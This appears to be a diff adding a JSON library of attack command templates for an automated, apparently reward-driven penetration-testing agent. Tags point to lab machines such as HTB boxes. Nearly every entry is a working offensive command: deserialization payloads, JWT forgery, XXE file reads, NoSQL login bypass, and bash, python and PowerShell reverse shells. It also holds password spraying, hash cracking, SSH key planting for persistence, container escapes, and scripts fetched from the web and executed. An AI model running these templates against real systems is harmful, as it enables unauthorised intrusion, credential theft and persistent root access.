+      "phase": "EXPLOITATION",
+      "description": "Generate Java deserialization payload with ysoserial.",
+      "required_params": [
+        "gadget",
+        "cmd"
+      ],
+      "optional_params": {
+        "gadget": "CommonsCollections1"
+      },
+      "preconditions": [
+        "java_deser_found"
+      ],
+      "success_indicators": [
+        "rO0AB",
+        "base64"
+      ],
+      "tags": [
+        "rce",
+        "web",
+        "java",
+        "deserialization"
+      ],
+      "typical_reward": 15.0
+    },
+    "phpggc_laravel": {
+      "template": "phpggc Laravel/RCE1 system '{cmd}' | base64",
+      "phase": "EXPLOITATION",
+      "description": "Generate PHP deserialization payload for Laravel/Symfony.",
+      "required_params": [
+        "cmd"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "php_deser_found"
+      ],
+      "success_indicators": [
+        "base64",
+        "O:"
+      ],
+      "tags": [
+        "rce",
+        "laravel",
+        "php",
+        "web",
+        "deserialization"
+      ],
+      "typical_reward": 15.0
+    },
+    "jwt_none_attack": {
+      "template": "python3 -c \"import jwt; print(jwt.encode({{'sub':'{user}','role':'admin'}}, '', algorithm='none'))\"",
+      "phase": "EXPLOITATION",
+      "description": "JWT algorithm 'none' attack \u2014 forge admin token without secret.",
+      "required_params": [
+        "user"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "jwt_found"
+      ],
+      "success_indicators": [
+        "eyJ"
+      ],
+      "tags": [
+        "web",
+        "jwt",
+        "auth-bypass"
+      ],
+      "typical_reward": 12.0
+    },
+    "jwt_crack_secret": {
+      "template": "hashcat -m 16500 {jwt_file} {wordlist} --force",
+      "phase": "EXPLOITATION",
+      "description": "Crack JWT HMAC secret with hashcat.",
+      "required_params": [
+        "jwt_file",
+        "wordlist"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "jwt_found"
+      ],
+      "success_indicators": [
+        "Cracked",
+        "Status"
+      ],
+      "tags": [
+        "web",
+        "jwt",
+        "hashcat",
+        "credential"
+      ],
+      "typical_reward": 12.0
+    },
+    "xxe_file_read": {
+      "template": "curl -s -X POST '{url}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
+      "phase": "EXPLOITATION",
+      "description": "XXE injection to read local files via XML parser.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "xml_endpoint_found",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "root:",
+        "bin/bash",
+        "nologin"
+      ],
+      "tags": [
+        "xml",
+        "web",
+        "xxe"
+      ],
+      "typical_reward": 10.0
+    },
+    "nosqli_login_bypass": {
+      "template": "curl -s '{url}' -H 'Content-Type: application/json' -d '{{\"username\":{{\"$ne\":\"\"}},\"password\":{{\"$ne\":\"\"}}}}'",
+      "phase": "EXPLOITATION",
+      "description": "NoSQL injection login bypass via MongoDB $ne operator.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "welcome",
+        "dashboard",
+        "admin",
+        "session",
+        "token"
+      ],
+      "tags": [
+        "mongodb",
+        "web",
+        "nosql",
+        "auth-bypass"
+      ],
+      "typical_reward": 10.0
+    },
+    "revshell_bash": {
+      "template": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+      "phase": "EXPLOITATION",
+      "description": "Bash reverse shell \u2014 most common Linux reverse shell.",
+      "required_params": [
+        "lhost",
+        "lport"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "bash",
+        "$",
+        "#"
+      ],
+      "tags": [
+        "reverse-shell",
+        "shell",
+        "linux"
+      ],
+      "typical_reward": 3.0
+    },
+    "revshell_python": {
+      "template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+      "phase": "EXPLOITATION",
+      "description": "Python reverse shell \u2014 works on most Linux systems with Python3.",
+      "required_params": [
+        "lhost",
+        "lport"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "bash",
+        "$",
+        "#"
+      ],
+      "tags": [
+        "reverse-shell",
+        "python",
+        "shell",
+        "linux"
+      ],
+      "typical_reward": 3.0
+    },
+    "revshell_powershell": {
+      "template": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\"",
+      "phase": "EXPLOITATION",
+      "description": "PowerShell reverse shell for Windows targets.",
+      "required_params": [
+        "lhost",
+        "lport"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "PS ",
+        "C:\\"
+      ],
+      "tags": [
+        "windows",
+        "powershell",
+        "reverse-shell",
+        "shell"
+      ],
+      "typical_reward": 3.0
+    },
+    "crackmapexec_password_spray": {
+      "template": "crackmapexec smb {target} -u {userlist} -p {password} --continue-on-success",
+      "phase": "EXPLOITATION",
+      "description": "Password spray across multiple users via SMB.",
+      "required_params": [
+        "target",
+        "userlist",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "[+]",
+        "Pwn3d",
+        "STATUS_LOGON_FAILURE"
+      ],
+      "tags": [
+        "ad",
+        "smb",
+        "password-spray"
+      ],
+      "typical_reward": 8.0
+    },
+    "pcap_strings_extract": {
+      "template": "strings /tmp/capture.pcap | grep -iE 'user|pass|login|USER|PASS' | head -30",
+      "phase": "EXPLOITATION",
+      "description": "Extract plaintext credentials from PCAP using strings",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "web_paths_discovered"
+      ],
+      "success_indicators": [
+        "USER",
+        "PASS",
+        "password",
+        "login"
+      ],
+      "tags": [
+        "credentials",
+        "pcap",
+        "extraction"
+      ],
+      "typical_reward": 20.0
+    },
+    "pcap_tshark_ftp": {
+      "template": "tshark -r /tmp/capture.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS' -T fields -e ftp.request.arg 2>/dev/null || strings /tmp/capture.pcap | grep -E '^(USER|PASS) '",
+      "phase": "EXPLOITATION",
+      "description": "Extract FTP credentials from PCAP using tshark or strings fallback",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "web_paths_discovered"
+      ],
+      "success_indicators": [
+        "USER",
+        "PASS"
+      ],
+      "tags": [
+        "ftp",
+        "credentials",
+        "pcap"
+      ],
+      "typical_reward": 20.0
+    },
+    "idor_download_file": {
+      "template": "curl -s {base_url}/{id} -o /tmp/idor_file_{id}",
+      "phase": "EXPLOITATION",
+      "description": "Download a specific file/resource via IDOR vulnerability",
+      "required_params": [
+        "base_url",
+        "id"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "web_paths_discovered"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "download",
+        "web",
+        "idor"
+      ],
+      "typical_reward": 5.0
+    },
+    "cred_reuse_ssh": {
+      "template": "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{target} 'id && whoami && cat /etc/passwd | grep -v nologin | grep -v false | head -10'",
+      "phase": "EXPLOITATION",
+      "description": "Try discovered credentials on SSH for shell access",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "uid=",
+        "whoami",
+        "/bin/bash",
+        "/bin/sh"
+      ],
+      "tags": [
+        "credential_reuse",
+        "shell",
+        "ssh"
+      ],
+      "typical_reward": 50.0
+    },
+    "cred_reuse_ftp": {
+      "template": "curl -s ftp://{username}:{password}@{target}/ --connect-timeout 5",
+      "phase": "EXPLOITATION",
+      "description": "Try discovered credentials on FTP",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "drwx",
+        "-rw",
+        "total",
+        "226"
+      ],
+      "tags": [
+        "ftp",
+        "credential_reuse"
+      ],
+      "typical_reward": 10.0
+    },
+    "smbclient_get_file": {
+      "template": "smbclient //{target}/{share} -N -c 'ls; get {filename}' 2>/dev/null || smbclient //{target}/{share} -U '{username}%{password}' -c 'ls; get {filename}'",
+      "phase": "EXPLOITATION",
+      "description": "Download a file from an SMB share",
+      "required_params": [
+        "target",
+        "share",
+        "filename"
+      ],
+      "optional_params": {
+        "username": "",
+        "password": ""
+      },
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "getting file",
+        "NT_STATUS_OK"
+      ],
+      "tags": [
+        "smb",
+        "download",
+        "loot"
+      ],
+      "typical_reward": 10.0
+    },
+    "gpp_decrypt": {
+      "template": "gpp-decrypt '{encrypted_password}'",
+      "phase": "EXPLOITATION",
+      "description": "Decrypt Group Policy Preferences (GPP) cPassword from Groups.xml",
+      "required_params": [
+        "encrypted_password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "ad",
+        "windows",
+        "gpp",
+        "credentials"
+      ],
+      "typical_reward": 20.0
+    },
+    "hashcat_krb5": {
+      "template": "hashcat -m {hash_mode} {hash_file} {wordlist} --force 2>/dev/null | tail -20",
+      "phase": "EXPLOITATION",
+      "description": "Crack Kerberos/NTLM/bcrypt hashes with hashcat",
+      "required_params": [
+        "hash_file"
+      ],
+      "optional_params": {
+        "hash_mode": "18200",
+        "wordlist": "/usr/share/wordlists/rockyou.txt"
+      },
+      "preconditions": [],
+      "success_indicators": [
+        "Cracked",
+        "Status...........: Cracked",
+        ":"
+      ],
+      "tags": [
+        "offline",
+        "hash",
+        "cracking"
+      ],
+      "typical_reward": 20.0
+    },
+    "john_crack": {
+      "template": "john {hash_file} --wordlist={wordlist} 2>/dev/null && john {hash_file} --show",
+      "phase": "EXPLOITATION",
+      "description": "Crack password hashes with John the Ripper",
+      "required_params": [
+        "hash_file"
+      ],
+      "optional_params": {
+        "wordlist": "/usr/share/wordlists/rockyou.txt"
+      },
+      "preconditions": [],
+      "success_indicators": [
+        "cracked",
+        "password"
+      ],
+      "tags": [
+        "offline",
+        "hash",
+        "cracking"
+      ],
+      "typical_reward": 20.0
+    },
+    "erlang_cookie_extract": {
+      "template": "cat /var/lib/erlang/.erlang.cookie 2>/dev/null || cat ~/.erlang.cookie 2>/dev/null || find / -name .erlang.cookie -readable 2>/dev/null -exec cat {{}} \\;",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Extract Erlang magic cookie for RCE via Erlang distribution protocol.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "linux_shell_obtained"
+      ],
+      "success_indicators": [
+        "COOKIE",
+        "cookie"
+      ],
+      "tags": [
+        "privesc",
+        "htb",
+        "soulmate",
+        "erlang",
+        "cookie"
+      ],
+      "typical_reward": 20.0
+    },
+    "erlang_otp_rce": {
+      "template": "erl -sname exploit -setcookie '{cookie}' -remsh target@{hostname} -eval 'os:cmd(\"id\").'",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "CVE-2025-32433 \u2014 Erlang/OTP SSH RCE via distribution protocol with stolen cookie.",
+      "required_params": [],
+      "optional_params": {
+        "cookie": "ERLANGCOOKIE",
+        "hostname": "localhost"
+      },
+      "preconditions": [
+        "linux_shell_obtained"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root",
+        "euid"
+      ],
+      "tags": [
+        "privesc",
+        "rce",
+        "htb",
+        "soulmate",
+        "cve_2025_32433",
+        "erlang",
+        "otp"
+      ],
+      "typical_reward": 130.0
+    },
+    "linpeas_ms2": {
+      "template": "{ echo 'sudo -l 2>/dev/null; echo ---CRON---; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; echo ---CAPS---; getcap -r /usr /bin /sbin 2>/dev/null'; sleep 3; } | timeout 15 telnet {target} 1524",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "LinPEAS-equivalent via MS2 ingreslock backdoor (sudo, cron, capabilities).",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "linux_shell_obtained"
+      ],
+      "success_indicators": [
+        "SUID",
+        "NOPASSWD",
+        "writable",
+        "CVE-",
+        "cap_setuid"
+      ],
+      "tags": [
+        "ms2",
+        "privesc",
+        "enumeration",
+        "linux"
+      ],
+      "typical_reward": 3.0
+    },
+    "linpeas_local": {
+      "template": "./linpeas.sh",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Run LinPEAS from local copy.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "linux_shell_obtained",
+        "linpeas_uploaded"
+      ],
+      "success_indicators": [
+        "95%",
+        "Vulnerable"
+      ],
+      "tags": [
+        "privesc",
+        "linux"
+      ],
+      "typical_reward": 3.0
+    },
+    "sudo_list": {
+      "template": "{ echo 'sudo -l 2>/dev/null || echo ALREADY_ROOT'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Check sudo privileges on target via MS2 ingreslock backdoor.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "NOPASSWD",
+        "ALL",
+        "(root)",
+        "ALREADY_ROOT"
+      ],
+      "tags": [
+        "ms2",
+        "sudo",
+        "linux"
+      ],
+      "typical_reward": 2.0
+    },
+    "find_suid": {
+      "template": "find /usr /bin /sbin -perm -4000 -type f 2>/dev/null",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Find SUID binaries that may allow privilege escalation.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "/usr/bin/",
+        "/usr/sbin/",
+        "nmap",
+        "vim",
+        "find",
+        "bash"
+      ],
+      "tags": [
+        "privesc",
+        "suid",
+        "linux"
+      ],
+      "typical_reward": 5.0
+    },
+    "find_capabilities": {
+      "template": "getcap -r /usr /bin /sbin 2>/dev/null",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Find binaries with Linux capabilities.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "linux_shell_obtained"
+      ],
+      "success_indicators": [
+        "cap_",
+        "=ep"
+      ],
+      "tags": [
+        "capabilities",
+        "linux"
+      ],
+      "typical_reward": 2.0
+    },
+    "find_writable_etc": {
+      "template": "find /etc -writable -type f 2>/dev/null",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Find writable config files. passwd, shadow, sudoers?",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "linux_shell_obtained"
+      ],
+      "success_indicators": [
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/sudoers"
+      ],
+      "tags": [
+        "writable",
+        "linux"
+      ],
+      "typical_reward": 3.0
+    },
+    "pspy": {
+      "template": "./pspy64",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Monitor processes without root. Find cron jobs, scripts.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "linux_shell_obtained",
+        "pspy_uploaded"
+      ],
+      "success_indicators": [
+        "CMD:",
+        "UID=0"
+      ],
+      "tags": [
+        "process",
+        "cron",
+        "linux"
+      ],
+      "typical_reward": 2.5
+    },
+    "kernel_exploit_check": {
+      "template": "uname -a && cat /etc/os-release",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Check kernel version and OS for known exploits (DirtyCow, etc).",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "Linux",
+        "Ubuntu",
+        "CentOS",
+        "Debian"
+      ],
+      "tags": [
+        "privesc",
+        "kernel",
+        "linux"
+      ],
+      "typical_reward": 4.0
+    },
+    "winpeas": {
+      "template": ".\\winPEASx64.exe",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "WinPEAS - comprehensive Windows privilege escalation checker.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "winpeas_uploaded",
+        "windows_shell_obtained"
+      ],
+      "success_indicators": [
+        "[!]",
+        "Vulnerable",
+        "Password"
+      ],
+      "tags": [
+        "windows",
+        "privesc"
+      ],
+      "typical_reward": 3.0
+    },
+    "whoami_all": {
+      "template": "whoami /all",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Show current user, groups, and privileges.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "windows_shell_obtained"
+      ],
+      "success_indicators": [
+        "PRIVILEGES",
+        "GROUP INFORMATION"
+      ],
+      "tags": [
+        "windows",
+        "enumeration"
+      ],
+      "typical_reward": 1.0
+    },
+    "systeminfo": {
+      "template": "systeminfo",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Get Windows system info. Check for patches.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "windows_shell_obtained"
+      ],
+      "success_indicators": [
+        "OS Name:",
+        "Hotfix(s):"
+      ],
+      "tags": [
+        "windows",
+        "enumeration"
+      ],
+      "typical_reward": 1.0
+    },
+    "windows_exploit_suggester": {
+      "template": "python windows-exploit-suggester.py --database {database} --systeminfo {sysinfo_file}",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Suggest exploits based on systeminfo output.",
+      "required_params": [
+        "database",
+        "sysinfo_file"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "systeminfo_obtained"
+      ],
+      "success_indicators": [
+        "[E]",
+        "[M]",
+        "CVE-"
+      ],
+      "tags": [
+        "windows",
+        "exploits"
+      ],
+      "typical_reward": 2.0
+    },
+    "accesschk_services": {
+      "template": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Check service permissions for privilege escalation.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "accesschk_uploaded",
+        "windows_shell_obtained"
+      ],
+      "success_indicators": [
+        "SERVICE_ALL_ACCESS",
+        "SERVICE_CHANGE_CONFIG"
+      ],
+      "tags": [
+        "windows",
+        "services"
+      ],
+      "typical_reward": 2.5
+    },
+    "powerup": {
+      "template": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{url}'); Invoke-AllChecks\"",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "PowerUp - PowerShell privilege escalation checks.",
+      "required_params": [],
+      "optional_params": {
+        "url": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
+      },
+      "preconditions": [
+        "windows_shell_obtained"
+      ],
+      "success_indicators": [
+        "AbuseFunction",
+        "ModifiablePath"
+      ],
+      "tags": [
+        "privesc",
+        "powershell",
+        "windows"
+      ],
+      "typical_reward": 3.0
+    },
+    "sudo_check": {
+      "template": "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target} 'sudo -l 2>/dev/null; echo ---SUDOERS---; cat /etc/sudoers 2>/dev/null | head -30; echo ---ID---; id'",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Check sudo privileges, sudoers file, and current user id for privilege escalation vectors via SSH.",
+      "required_params": [
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "(ALL)",
+        "NOPASSWD",
+        "may run",
+        "uid=0"
+      ],
+      "tags": [
+        "privesc",
+        "sudo",
+        "linux"
+      ],
+      "typical_reward": 6.0
+    },
+    "linpeas": {
+      "template": "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target} 'sudo -l 2>/dev/null; echo ---CRON---; ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; echo ---CAPS---; getcap -r /usr /bin /sbin 2>/dev/null'",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Manual Linux privilege escalation enumeration (sudo, cron, capabilities) via SSH. SUID check is separate find_suid.",
+      "required_params": [
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "SUID",
+        "NOPASSWD",
+        "writable",
+        "cap_setuid"
+      ],
+      "tags": [
+        "enum",
+        "privesc",
+        "linux"
+      ],
+      "typical_reward": 5.0
+    },
+    "certipy_req": {
+      "template": "certipy req -u {username}@{domain} -p {password} -ca {ca} -template {template} -dc-ip {target}",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Request certificate for privilege escalation.",
+      "required_params": [
+        "username",
+        "password",
+        "domain",
+        "ca",
+        "template",
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "vulnerable_template_found"
+      ],
+      "success_indicators": [
+        "pfx",
+        "Saved"
+      ],
+      "tags": [
+        "ad",
+        "privesc",
+        "certificates"
+      ],
+      "typical_reward": 8.0
+    },
+    "find_sgid": {
+      "template": "find /usr /bin /sbin -perm -2000 -type f 2>/dev/null",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Find SGID binaries for potential group-based privesc.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "/usr/bin/",
+        "wall",
+        "ssh-agent"
+      ],
+      "tags": [
+        "privesc",
+        "sgid",
+        "linux"
+      ],
+      "typical_reward": 3.0
+    },
+    "cron_check": {
+      "template": "cat /etc/crontab && ls -la /etc/cron.* 2>/dev/null && crontab -l 2>/dev/null",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Check cron jobs for writable scripts or misconfigurations.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "root",
+        "* * *",
+        ".sh",
+        "python"
+      ],
+      "tags": [
+        "privesc",
+        "cron",
+        "linux"
+      ],
+      "typical_reward": 4.0
+    },
+    "writable_etc_passwd": {
+      "template": "ls -la /etc/passwd && test -w /etc/passwd && echo 'WRITABLE'",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Check if /etc/passwd is writable for adding root user.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "WRITABLE"
+      ],
+      "tags": [
+        "privesc",
+        "passwd",
+        "linux"
+      ],
+      "typical_reward": 6.0
+    },
+    "capability_check": {
+      "template": "getcap -r /usr /bin /sbin 2>/dev/null",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Find binaries with Linux capabilities for privesc.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "cap_setuid",
+        "cap_setgid",
+        "cap_sys_admin"
+      ],
+      "tags": [
+        "privesc",
+        "capabilities",
+        "linux"
+      ],
+      "typical_reward": 5.0
+    },
+    "docker_privesc": {
+      "template": "docker run -v /:/host --rm -it alpine chroot /host sh",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Escape to host via Docker socket if user is in docker group.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "docker_group"
+      ],
+      "success_indicators": [
+        "#",
+        "root"
+      ],
+      "tags": [
+        "privesc",
+        "docker",
+        "container"
+      ],
+      "typical_reward": 8.0
+    },
+    "lxd_privesc": {
+      "template": "lxc init ubuntu:18.04 privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root && lxc start privesc && lxc exec privesc -- /bin/sh",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "LXD/LXC container escape for root access.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "lxd_group"
+      ],
+      "success_indicators": [
+        "root"
+      ],
+      "tags": [
+        "privesc",
+        "lxd",
+        "container"
+      ],
+      "typical_reward": 8.0
+    },
+    "pspy_monitor": {
+      "template": "./pspy64 -p -i 1000",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Monitor processes without root. Find scheduled tasks and cron activity.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "CMD:",
+        "UID=0",
+        "cron"
+      ],
+      "tags": [
+        "privesc",
+        "monitoring",
+        "process"
+      ],
+      "typical_reward": 4.0
+    },
+    "ssh_key_plant": {
+      "template": "cp /root/.ssh/id_rsa.pub /tmp/nfs_mount/root/.ssh/authorized_keys",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Plant SSH public key via NFS for persistent root access.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "success",
+        "copied"
+      ],
+      "tags": [
+        "ms2",
+        "privesc",
+        "persistence",
+        "nfs"
+      ],
+      "typical_reward": 30.0
+    },
+    "docker_sock_escape": {
+      "template": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Docker socket escape \u2014 mount host filesystem and chroot.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "docker_socket_found"
+      ],
+      "success_indicators": [
+        "root@",
+        "#",
+        "host"
+      ],
+      "tags": [
+        "privesc",
+        "docker",
+        "container-escape"
+      ],
+      "typical_reward": 25.0
+    },
+    "lxd_escape": {
+      "template": "lxd init --auto && lxc image import alpine.tar.gz --alias alpine && lxc init alpine privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true && lxc start privesc && lxc exec privesc /bin/bash",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "LXD group privilege escalation \u2014 create privileged container with host mount.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "root@",
+        "#"
+      ],
+      "tags": [
+        "privesc",
+        "container-escape",
+        "lxd",
+        "linux"
+      ],
+      "typical_reward": 25.0
+    },
+    "privesc_getcap": {
+      "template": "getcap -r / 2>/dev/null",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Find binaries with Linux capabilities set (e.g., cap_setuid for root)",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "cap_setuid",
+        "cap_net_raw",
+        "cap_dac_override",
+        "cap_sys_admin"
+      ],
+      "tags": [
+        "privesc",
+        "capabilities",
+        "linux"
+      ],
+      "typical_reward": 15.0
+    },
+    "privesc_cap_setuid_python": {
+      "template": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -c \\\"id && cat /root/root.txt 2>/dev/null && cat /home/*/user.txt 2>/dev/null\\\"\")'",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Exploit cap_setuid on python3 to get root shell \u2014 GTFOBins technique",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "uid=0(root)",
+        "root.txt"
+      ],
+      "tags": [
+        "privesc",
+        "capabilities",
+        "python",
+        "gtfobins",
+        "linux"
+      ],
+      "typical_reward": 130.0
+    },
+    "privesc_cap_setuid_perl": {
+      "template": "perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash -c \\\"id && cat /root/root.txt 2>/dev/null\\\"\";'",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Exploit cap_setuid on perl to get root shell \u2014 GTFOBins technique",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "uid=0(root)",
+        "root.txt"
+      ],
+      "tags": [
+        "privesc",
+        "perl",
+        "capabilities",
+        "gtfobins",
+        "linux"
+      ],
+      "typical_reward": 130.0
+    },
+    "privesc_sudo_l": {
+      "template": "sudo -l",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "List sudo privileges for current user",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "NOPASSWD",
+        "ALL",
+        "may run",
+        "(root)"
+      ],
+      "tags": [
+        "privesc",
+        "sudo",
+        "linux"
+      ],
+      "typical_reward": 10.0
+    },
+    "privesc_suid_find": {
+      "template": "find / -perm -4000 -type f 2>/dev/null",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Find SUID binaries that may allow privilege escalation",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "/usr/bin/",
+        "/usr/sbin/",
+        "pkexec",
+        "doas"
+      ],
+      "tags": [
+        "privesc",
+        "suid",
+        "linux"
+      ],
+      "typical_reward": 10.0
+    },
+    "privesc_linpeas": {
+      "template": "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+      "phase": "PRIVILEGE_ESCALATION",
+      "description": "Run LinPEAS for comprehensive Linux privilege escalation enumeration",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained"
+      ],
+      "success_indicators": [
+        "Vulnerable",
+        "SUID",
+        "Capabilities",
+        "Interesting"
+      ],
+      "tags": [
+        "privesc",
+        "enumeration",
